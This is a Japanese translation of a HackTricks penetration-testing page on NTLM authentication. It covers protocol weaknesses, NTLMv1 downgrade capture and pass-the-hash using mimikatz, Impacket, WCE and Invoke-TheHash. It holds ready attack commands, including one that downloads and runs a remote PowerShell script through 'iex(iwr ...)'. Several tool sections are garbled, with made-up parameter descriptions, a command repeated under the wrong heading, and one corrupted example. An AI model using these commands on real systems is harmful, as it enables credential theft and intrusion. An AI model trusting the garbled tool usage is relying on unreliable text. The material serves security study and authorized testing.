# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するために、PRを提出して** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に参加してください。**

</details>

## 基本情報

**NTLMの資格情報**: ドメイン名（ある場合）、ユーザー名、パスワードハッシュ。

**LM**は**Windows XPとサーバー2003**でのみ**有効**です（LMハッシュはクラックできます）。LMハッシュAAD3B435B51404EEAAD3B435B51404EEは、LMが使用されていないことを意味します（空の文字列のLMハッシュです）。

デフォルトでは**Kerberos**が使用されるため、NTLMは**Active Directoryが構成されていない**、**ドメインが存在しない**、**Kerberosが機能していない**（構成が不正）か、**クライアント**が有効なホスト名の代わりにIPを使用して接続しようとする場合にのみ使用されます。

NTLM認証の**ネットワークパケット**にはヘッダー "**NTLMSSP**" があります。

プロトコル：LM、NTLMv1、およびNTLMv2は、DLL %windir%\Windows\System32\msv1\_0.dllでサポートされています。

## LM、NTLMv1、およびNTLMv2

使用されるプロトコルを確認および設定できます：

### GUI

_secpol.msc_を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワークセキュリティ：LANマネージャ認証レベル。レベルは0から5までの6つあります。

![](<../../.gitbook/assets/image (92).png>)

### レジストリ

これにより、レベル5が設定されます：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します。
2. クライアントマシンは、**ドメイン名**と**ユーザー名**を送信して**認証要求を送信**します。
3. **サーバー**は**チャレンジ**を送信します。
4. クライアントは、パスワードのハッシュをキーとして**チャレンジを暗号化**し、応答として送信します。
5. **サーバーは**、**ドメイン名、ユーザー名、チャレンジ、応答**を**ドメインコントローラー**に送信します。Active Directoryが構成されていない場合や、ドメイン名がサーバーの名前である場合、資格情報は**ローカルで確認**されます。
6. **ドメインコントローラーは**、すべてが正しいかどうかを確認し、情報をサーバーに送信します。

**サーバー**と**ドメインコントローラー**は、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。ドメインコントローラーはサーバーのパスワードを知っているため、これが可能です（これは**NTDS.DIT**データベース内にあります）。

### ローカルNTLM認証スキーム

認証は、**以前に述べたものと同じですが**、**サーバー**は**SAM**ファイル内で認証しようとする**ユーザーのハッシュを知っています**。したがって、ドメインコントローラーに問い合わせる代わりに、**サーバー自体で**ユーザーの認証を確認します。

### NTLMv1チャレンジ

**チャレンジの長さは8バイト**で、**応答の長さは24バイト**です。

**ハッシュNT（16バイト）**は、**7バイトずつ3つのパート**（7B + 7B +（2B + 0x00\*5））に分割されます：**最後のパートはゼロで埋められます**。次に、**チャレンジ**は各パートごとに**別々に暗号化**され、**結果の**暗号化されたバイトが**結合**されます。合計：8B + 8B + 8B = 24バイト。

**問題点**：

- **ランダム性の欠如**
- 3つのパートは**個別に攻撃**され、NTハッシュを見つけることができます
- **DESは解読可能**
- 3番目のキーは常に**5つのゼロ**で構成されています。
- **同じチャレンジ**が与えられると、**応答**は**同じ**になります。したがって、被害者に文字列「**1122334455667788**」を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して攻撃することができます。

### NTLMv1攻撃

現在では、Unconstrained Delegationが構成された環境は少なくなってきていますが、これは**構成されたプリントスプーラーサービス**を悪用することができないことを意味しません。

既にADで持っているいくつかの資格情報/セッションを使用して、プリンターに対して**コントロール下のホスト**に対して**認証を要求**することができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、**認証チャレンジを1122334455667788**に設定し、認証試行をキャプチャし、それが**NTLMv1**を使用して行われた場合、それを**クラック**することができます。\
`responder`を使用している場合は、**認証をダウングレード**するためにフラグ`--lm`を使用してみることができます。\
_このテクニックでは、認証はNTLMv1を使用して実行する必要があります（NTLMv2は有効ではありません）。_

プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用するため、一般的な**辞書**を使用してクラックすることは**おそらくできません**。しかし、**NTLMv1**認証は**DESを使用**しています（[詳細はこちら](./#ntlmv1-challenge)）。したがって、DESをクラックするために特に専用のサービスを使用することで、それをクラックすることができます（たとえば、[https://crack.sh/](https://crack.sh)を使用できます）。

### NTLMv2チャレンジ

**チャレンジの長さは8バイト**で、**2つの応答が送信されます**：1つは**24バイト**で、もう1つは**可変長**です。

**最初の応答**は、**クライアントとドメイン**からなる**文字列**を**HMAC\_MD5**で暗号化し、**NTハッシュ**の**ハッシュMD4**を**キー**として使用します。次に、**結果**は**チャレンジ**を暗号化するための**キー**として使用されます。これには、**8バイトのクライアントチャレンジ**が追加されます。合計：24 B。

**2番目の応答**は、**いくつかの値**（新しいクライアントチャレンジ、**リプレイ攻撃**を防ぐための**タイムスタンプ**など）を使用して作成されます。

**成功した認証プロセスをキャプチャした**pcapがある場合、このガイドに従ってドメイン、ユーザー名、チャレンジ、応答を取得し、パスワードをクラックしようとすることができます：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## パス・ザ・ハッシュ

**被害者のハッシュを持っている場合**、それを使用して**被害者になり**ます。\
その**ハッシュ**を使用して**NTLM認証を実行するツール**を使用する必要があります。**または**、新しい**セッションログオン**を作成し、その**ハッシュ**を**LSASS**に**注入**することができます。そのため、**NTLM認証が実行されると、そのハッシュが使用されます。**最後のオプションがmimikatzが行うことです。

**パス・ザ・ハッシュ攻撃はコンピューターアカウントを使用しても実行できることに注意してください。**

### **Mimikatz**

**管理者として実行する必要があります**。
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これにより、mimikatzを起動したユーザーに属するプロセスが開始されますが、LSASS内部ではmimikatzパラメータ内の保存された資格情報が使用されます。その後、そのユーザーとしてネットワークリソースにアクセスできます（`runas /netonly`トリックと似ていますが、平文パスワードを知る必要はありません）。

### Linuxからのハッシュの渡し

LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得することができます。\
[**ここをクリックして方法を学びましょう。**](../../windows/ntlm/broken-reference/)

### Impacket Windowsコンパイル済みツール

Windows用のimpacketバイナリは[こちらからダウンロードできます](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（この場合、コマンドを指定する必要があります。cmd.exeやpowershell.exeは対話型シェルを取得するためには無効です）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 他にもいくつかのImpacketバイナリがあります...

### Invoke-TheHash

PowerShellスクリプトはこちらから入手できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

`Invoke-WMIExec`は、Windowsマシン上でWMI（Windows Management Instrumentation）を使用してリモートコード実行を行うためのPowerShellスクリプトです。

このスクリプトは、WMIを介してリモートマシンに接続し、指定したコマンドを実行することができます。これにより、リモートマシン上で権限昇格や情報収集などのタスクを実行することができます。

使用方法は以下の通りです。

```powershell
Invoke-WMIExec -Target <TargetIP> -Username <Username> -Password <Password> -Command <Command>
```

- `<TargetIP>`: ターゲットマシンのIPアドレス
- `<Username>`: WMI接続に使用するユーザー名
- `<Password>`: WMI接続に使用するパスワード
- `<Command>`: 実行するコマンド

このスクリプトは、WMIを介してリモートマシンに接続するため、ターゲットマシンでWMIが有効になっている必要があります。また、適切な権限を持つユーザー名とパスワードを指定する必要があります。

`Invoke-WMIExec`は、ペネトレーションテストやセキュリティオーディットなどの目的で使用されることがありますが、悪意のある目的で使用することは違法です。常に法律と倫理に従って行動してください。
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

`Invoke-SMBClient`は、WindowsシステムでSMB（Server Message Block）プロトコルを使用してリモートサーバーに接続するためのPowerShellスクリプトです。このスクリプトは、SMBを介してファイルの送受信やリモートコマンドの実行など、さまざまな操作を実行することができます。

##### 使用法

以下は、`Invoke-SMBClient`スクリプトの基本的な使用法です。

```powershell
Invoke-SMBClient -Target <target> -Username <username> -Password <password> -Command <command>
```

- `<target>`: 接続先のリモートサーバーのIPアドレスまたはホスト名を指定します。
- `<username>`: リモートサーバーへの接続に使用するユーザー名を指定します。
- `<password>`: ユーザーのパスワードを指定します。
- `<command>`: 実行するリモートコマンドを指定します。

##### 例

以下は、`Invoke-SMBClient`スクリプトの使用例です。

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username admin -Password P@ssw0rd -Command "dir C:\"
```

この例では、192.168.1.100というIPアドレスのリモートサーバーに、adminというユーザー名とP@ssw0rdというパスワードで接続し、`dir C:\`コマンドを実行しています。

##### 注意事項

`Invoke-SMBClient`スクリプトを使用する際には、適切な権限を持つユーザー名とパスワードを使用することをお勧めします。また、リモートサーバーへのアクセス権限を持っていることを確認してください。
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Invoke-SMBEnumは、WindowsシステムでSMB（Server Message Block）プロトコルを使用してネットワーク共有を列挙するためのPowerShellスクリプトです。このスクリプトは、ネットワーク上のホストに対してSMBバージョンのスキャンを実行し、共有フォルダ、ユーザー、グループ、セキュリティポリシーなどの情報を収集します。

このスクリプトを使用すると、ネットワーク内の潜在的なセキュリティリスクを特定することができます。例えば、デフォルトの共有フォルダや不適切なアクセス設定がある場合、悪意のあるユーザーが機密情報にアクセスする可能性があります。

Invoke-SMBEnumは、以下のようなオプションを使用して実行できます：

- `-Target`: スキャン対象のホストのIPアドレスまたはホスト名を指定します。
- `-Port`: スキャンするポート番号を指定します。デフォルトは445です。
- `-Threads`: 同時に実行するスレッド数を指定します。デフォルトは10です。
- `-OutputFile`: 結果を保存するファイルのパスを指定します。

以下は、Invoke-SMBEnumの使用例です：

```powershell
Invoke-SMBEnum -Target 192.168.1.100 -Port 445 -Threads 20 -OutputFile C:\smb_enum_results.txt
```

このコマンドは、192.168.1.100というIPアドレスのホストに対して、ポート番号445でスキャンを実行し、20のスレッドを使用して結果をC:\smb_enum_results.txtに保存します。

Invoke-SMBEnumは、ネットワーク共有のセキュリティ評価やペネトレーションテストにおいて非常に有用なツールです。ただし、権限を持たないネットワークに対して実行する場合は、法的な制約や許可を確認する必要があります。
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この関数は、他のすべての関数を組み合わせたものです。複数のホストを渡すことができ、特定のホストを除外することもできます。使用するオプション（SMBExec、WMIExec、SMBClient、SMBEnum）を選択することもできます。SMBExecとWMIExecのいずれかを選択し、ただし**Command**パラメータを指定しない場合、十分な権限があるかどうかを**チェック**するだけです。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM パス・ザ・ハッシュ](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは、mimikatzと同じことを行います（LSASSメモリの変更）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### ユーザー名とパスワードを使用したWindowsリモート実行の手動方法

[こちらのページ](../lateral-movement/)で、Windowsホストから資格情報を取得する方法について詳細を確認できます。

## Windowsホストからの資格情報の抽出

**Windowsホストから資格情報を取得する方法についての詳細は、[こちらのページ](broken-reference)を参照してください。**

## NTLMリレーとレスポンダー

**これらの攻撃を実行する方法についての詳細なガイドは、[こちら](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)を参照してください。**

## ネットワークキャプチャからのNTLMチャレンジの解析

[https://github.com/mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide)を使用することができます。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)をご覧ください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
